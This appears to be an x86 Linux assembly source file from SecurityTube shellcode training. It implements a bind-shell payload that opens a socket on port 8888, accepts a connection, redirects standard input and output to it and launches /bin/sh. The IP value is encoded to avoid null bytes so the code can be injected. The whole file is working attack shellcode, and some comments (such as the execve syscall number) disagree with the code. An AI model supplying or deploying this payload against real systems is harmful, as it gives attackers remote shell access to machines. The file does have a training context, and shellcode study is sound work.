; Filename: .nasm
; Author:  Ricardo Ruiz
; Website:  http://securitytube.net
; Training: http://securitytube-training.com 
;
;
; Purpose: 

global _start			

section .text

_start:

	; Write message
	xor eax, eax
	mov al, 0x4 		; Syscall 4 = Write
	xor ebx, ebx
	mov bl, 1 			; $ebx = 0x1
	push 0x0a2e2e2e		; 'Binding port...' message
	push 0x74726f70
	push 0x20676e69
	push 0x646e6942
	mov ecx,esp  		; $ecx = Address of stack, containing the message
	xor edx, edx		; 
	mov dl, 0x10 		; $edx = Message length (4*4=16)
	int 0x80

	; Socket - 359
	xor eax, eax
	mov ax, 0x167		; Syscall 359 = Socket
	mov bl, 2 		; $ebx = Domain = 2 [AF_INET]
	xor ecx, ecx
	mov cl, 1 		; $ecx = Type = 1 [SOCK_STREAM]
	xor edx, edx 		; $edx = Protocol = 0 [not set]
	int 0x80 
	
	; Bind - 361
	mov ebx, eax 			; $ebx = File descriptor stored in stack / returned by socket syscall
	xor eax, eax
	mov ax, 0x169 		; Syscall 361 = Bind
	xor edi, edi 			; edi is 0
	mov edi, 0x12111190 	; 0x12111190 = 0x100007F + 0x11111111
	sub edi, 0x11111111 	; 0x11111111 is an aux value. It can change to 0x22222222, 0x33333333 with the Python wrapper if IP+0x11111111 has NOPs
	push edi  				; The real IP gets stored. In this case ip = 127.0.0.1, big endian
    push word 0xb822 		; Port 8888, big endian
    push word 2 			; sin_family value is 2
	mov ecx, esp 			; $ecx = 0x2, port, ip
	mov dl, 0x66
	int 0x80				; eax = 0 now

	; Listen - 363
	mov ax, 0x16b 		; Syscall 363 = Listen, $ebx = File descriptor address
	xor ecx, ecx 		; $ecx = backlog = 0
	int 0x80			; eax = 0 now

	; Accept - 364
	mov ax, 0x16c 		; Syscall 364 = Accept ; $ecx = addr = 0, local address ; $edx = Address length is 16 bits 
	xor edx, edx
	xor esi, esi
	int 0x80

	;dup2 - 2, 1, 0
	mov ebx, eax		; $ebx = File descriptor address
	mov cl, 3			; $ecx = New file descriptor = 0
	int 0x80

bucle:

	xor eax, eax
	mov al, 0x3f  		; Syscall is 63 = Dup2
	int 0x80
	dec ecx
	jns bucle
	

	; Execve
	xor eax, eax
	push eax 			; Push 0x0
	push 0x68732f2f		; Push '//sh' string
	push 0x6e69622f		; Push '/bin' string
	mov ebx, esp 		; $ebx =  '/bin//sh' and 0x0
	push eax 			; Push  0x0
	mov edx, esp 		; $edx = 0x0
	push ebx 			; Push $ebx =  '/bin//sh' and 0x0
	mov ecx, esp 		; Address of stack, containing 0x0, '/bin//sh' and 0x0
	mov al, 11  		; Syscall is 17 = Execve
	int 0x80



